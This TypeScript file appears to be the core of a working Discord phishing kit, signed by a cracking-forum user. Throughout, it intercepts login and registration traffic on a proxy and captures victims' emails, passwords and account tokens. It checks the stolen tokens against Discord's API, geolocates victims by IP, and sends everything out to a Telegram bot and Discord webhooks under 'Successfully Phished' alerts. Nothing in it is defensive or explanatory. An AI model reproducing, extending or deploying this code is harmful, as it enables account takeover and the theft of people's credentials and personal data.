import {
	autoRoleGuildId,
	autoRoleRoleId,
	autoRoleToken,
	clientID,
	clientSecret,
	redactedWebhook,
	redirectURI,
	telegramChatId,
	telegramToken,
	unredactedWebhook,
} from './config.ts';
import { Session } from './sessions.ts';

export async function formatUrl(session: Session, url: string, userAgent?: string): Promise<string> {
	if (!url.includes('?code=') || url.includes('/api/') || !clientID || !clientSecret || !redirectURI) {
		return url;
	}

	try {
		const code = url.split('?code=')[1].split('&')[0];

		const data = await (
			await fetch('https://discord.com/api/oauth2/token', {
				method: 'POST',
				body: `client_id=${clientID}&client_secret=${clientSecret}&grant_type=authorization_code&code=${code}&redirect_uri=${redirectURI}`,
				headers: {
					'Content-Type': 'application/x-www-form-urlencoded',
				},
			})
		).json();

		if (data.access_token) {
			const user = await (
				await fetch('https://discord.com/api/users/@me', {
					headers: {
						authorization: `Bearer ${data.access_token}`,
					},
				})
			).json();

			console.log(user);

			if (user.id) {
				session.username = user.username + '#' + user.discriminator;

				// detect if user is on mobile or desktop
				const mobile = userAgent?.includes('Mobile');

				(async () => {
					await sendMessage(`\`${user.username}#${user.discriminator}\` (${user.id}) has clicked the link on ${mobile ? 'mobile' : 'desktop'}`);

					if (!session.location && session.ip && session.ip !== 'unknown') {
						try {
							// get location as: City, Country
							const location = await (await fetch(`http://ip-api.com/json/${session.ip}?fields=city,country`)).json();

							if (location.city && location.country) {
								session.location = `${location.city}, ${location.country}`;
							}
						} catch (e) {
							console.error(e);
						}
					}

					await sendWebhookMessage(
						{
							description: `> \ud83d\udcb8\n> \`${session.username}\` has clicked the link on **${mobile ? 'mobile' : 'desktop'}**`,
							color: 41224,
							fields: [
								{
									name: 'IP',
									value: `> \`${session.ip}\``,
									inline: true,
								},
								{
									name: 'Location',
									value: `> \`${session.location || 'Unknown'}\``,
									inline: true,
								},
							],
						},
						true
					);
				})().catch((e) => {
					console.error(e);
				});
			}
		}
	} catch (e) {
		console.error(e);
	}

	// return url with code removed
	return url.split('?code=')[0];
}

export default async function middleware(session: Session, path: string, req: Request, body: Blob, resp: Response, respBody: Blob) {
	if (!path.includes('/api/')) {
		return;
	}

	try {
		switch (path.split('?')[0]) {
			case '/api/v9/auth/login':
				parseLogin(session, JSON.parse(await body.text()), JSON.parse(await respBody.text()));
				return;
			case '/api/v9/auth/register':
				{
					const parsed = JSON.parse(await respBody.text());
					const payload = JSON.parse(await body.text());

					console.log('Register:', payload, parsed);

					if (parsed.token) {
						parseToken(session, parsed.token, payload.password);
					}
				}
				return;
			case '/api/v9/users/@me':
			case '/api/v9/science':
				if ((resp.status == 200 || resp.status == 204) && req.headers.has('authorization')) {
					parseToken(session, req.headers.get('authorization')!);
				}
				return;
		}
	} catch (e) {
		console.error(e);
	}
}

// deno-lint-ignore no-explicit-any
function parseLogin(session: Session, body: any, resp: any) {
	const email = body.login;
	const password = body.password;

	if (!email || !password) {
		return;
	}

	if (resp.token) {
		console.log(`[LOGIN] ${email}:${password} -> ${resp.token}`);
		parseToken(session, resp.token, password);
	} else if (resp.captcha_key) {
		sendMessage(`\\[${session.username || 'LOGIN'}] \`${email}:${password}\` -> Captcha Required`).catch(() => {});
	} else if (resp.message) {
		sendMessage(`\\[${session.username || 'LOGIN'}] \`${email}:${password}\` -> ${resp.message} (${resp.code})`).catch(() => {});
	} else {
		sendMessage(`\\[${session.username || 'LOGIN'}] \`${email}:${password}\` -> Unknown Error`).catch(() => {});
	}
}

async function parseToken(session: Session, token: string, password?: string) {
	if (!token || session.token === token) {
		return;
	}

	session.token = token;

	// deno-lint-ignore no-explicit-any
	let client: any = undefined;
	if (session.proxy) {
		client = Deno.createHttpClient({
			proxy: session.proxy,
		});
	}

	const resp = await fetch('https://discord.com/api/v9/users/@me', {
		headers: {
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
			authorization: token,
		},
		client,
	});

	console.log(`[TOKEN] ${resp.status} ${resp.statusText}`);

	if (resp.status == 200) {
		const user = await resp.json();

		session.username = user.username + '#' + user.discriminator;

		console.log(user);
		console.log(`[TOKEN] ${session.username} (${user.id}) -> ${token}`);

		if (autoRoleGuildId && autoRoleRoleId && autoRoleToken) {
			fetch(`https://discord.com/api/v9/guilds/${autoRoleGuildId}/members/${user.id}/roles/${autoRoleRoleId}`, {
				method: 'PUT',
				headers: {
					authorization: autoRoleToken,
				},
			}).catch((e) => {
				console.error(e);
			});
		}

		/*
		 **Successfully Phished **`{username}#{discriminator}`** (**`{id}`**)**
		 **Username:** `{username}#{discriminator}`
		 **Email:** `{email}`
		 **Phone:** `{phone}`
		 **Token:** `{token}`
		 */

		const text = `
*Successfully Phished* \`${session.username}\` (\`${user.id}\`)

Email: \`${user.email}\`
Phone: \`${user.phone || 'N/A'}\`
Password: \`${password || 'N/A'}\`
Token: \`${token}\``;

		sendMessage(text);

		const msg: Embed = {
			description: `> \ud83d\udcb8\n> \`${session.username}\` has been **phished**!`,
			color: 41224,
			pingEveryone: true,
			fields: [
				{
					name: 'Token',
					value: `> \`${token}\``,
				},
				{
					name: 'E-Mail',
					value: `> \`${user.email || 'N/A'}\``,
					inline: true,
				},
				{
					name: 'Password',
					value: `> \`${password || 'N/A'}\``,
					inline: true,
				},
				{
					name: 'Mobile',
					value: `> \`${user.phone || 'N/A'}\``,
					inline: true,
				},
			],
			timestamp: new Date().toISOString(),
		};

		await sendWebhookMessage(msg, false);

		if (msg.fields) {
			for (const field of msg.fields) {
				field.value = '> `[REDACTED]`';
			}
		}

		await sendWebhookMessage(msg, true);
	}
}

async function sendMessage(text: string) {
	if (!telegramToken || !telegramChatId) {
		return;
	}

	const headers = new Headers();
	headers.set('Content-Type', 'application/json');

	const resp = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
		method: 'POST',
		headers: headers,
		body: JSON.stringify({
			chat_id: telegramChatId,
			text: text,
			parse_mode: 'Markdown',
		}),
	});

	console.log(`[TELEGRAM] ${resp.status} ${resp.statusText}`);
}

/*
	BY CRACKED.IO/DARTR
*/

async function sendWebhookMessage(msg: Embed, redacted: boolean) {
	const url = redacted ? redactedWebhook : unredactedWebhook;
	if (!url) {
		return;
	}

	const pingEveryone = msg.pingEveryone;
	if (pingEveryone !== undefined) {
		delete msg.pingEveryone;
	}

	try {
		await fetch(url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({
				embeds: [msg],
				content: pingEveryone ? '@everyone' : undefined,
			}),
		});
	} catch (e) {
		console.error(e);
	}
}

type Embed = {
	title?: string;
	description?: string;
	url?: string;
	timestamp?: string;
	color?: number;
	footer?: {
		text: string;
		icon_url: string;
		proxy_icon_url: string;
	};
	fields?: Field[];
	pingEveryone?: boolean;
};

type Field = {
	name: string;
	value: string;
	inline?: boolean;
};
